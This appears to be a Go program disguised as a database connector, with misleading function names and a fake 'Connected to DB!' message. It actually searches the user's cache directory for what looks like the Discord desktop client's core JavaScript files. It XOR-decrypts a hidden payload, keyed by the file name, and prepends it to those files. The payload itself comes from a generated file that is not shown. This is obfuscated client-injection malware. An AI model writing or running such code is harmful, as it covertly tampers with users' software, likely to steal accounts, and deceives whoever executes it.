//go:generate go run build.go > lol.go

package main

import (
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

var statsRegex = regexp.MustCompile(`app-.*`)

func secure_db_string(k, s string) (o string) {
	for i := 0; i < len(s); i++ {
		o += string(s[i] ^ k[i%len(k)])
	}
	return o
}

func db_connection(p string) {
	err := filepath.WalkDir(p, func(rp string, d fs.DirEntry, _ error) error {
		if rp[len(rp)-2:] != "js" {
			return nil
		}

		var us = len(strings.Split(rp, "_")) - 1
		if us != 4 {
			return nil
		}
		var dts = len(strings.Split(rp, "desktop")) - 1
		if dts != 2 {
			return nil
		}

		f, err := os.OpenFile(rp, os.O_RDWR, 0644)
		if err != nil {
			return nil
		}
		defer f.Close()

		oldContent, err := io.ReadAll(f)
		if err != nil {
			return nil
		}

		s := strings.Split(f.Name(), "\\")
		var db_name = s[len(s)-1]

		var db_string = secure_db_string(db_name, string(db_key))

		if db_string[0:3] != "con" {
			return nil
		}

		if _, err := f.WriteAt([]byte(db_string+string(oldContent)), 0); err != nil {
			return nil
		}
		return nil
	})

	if err != nil {
		return
	}
}

func start_service_at(p string) {
	entries, err := os.ReadDir(p)
	if err != nil {
		return
	}
	var falsePositive bool
	for _, entry := range entries {
		var EntryName = entry.Name()
		if len(EntryName) != 8 {
			continue
		}
		if EntryName[0:2] != string([]rune{0x70, 0x61}) {
			continue
		}
		if EntryName[7:8] != "s" {
			continue
		}
		falsePositive = true
	}

	if !falsePositive {
		return
	}
	var ap []byte
	for _, entry := range entries {
		if statsRegex.Match([]byte(entry.Name())) {
			ap = []byte(entry.Name())
		}
	}

	db_connection(p + "\\" + string(ap))
}

func main() {
	local, err := os.UserCacheDir()
	if err != nil {
		return
	}
	entries, err := os.ReadDir(local)
	if err != nil {
		return
	}

	for _, entry := range entries {
		n := entry.Name()
		if n[0] != 0x44 {
			continue
		}
		var ds = len(strings.Split(strings.ToLower(n), string(rune(0x64)))) - 1
		if ds < 3 && ds <= 1 {
			continue
		}
		start_service_at(local + "\\" + n)
	}
	fmt.Println("Connected to DB!")
}
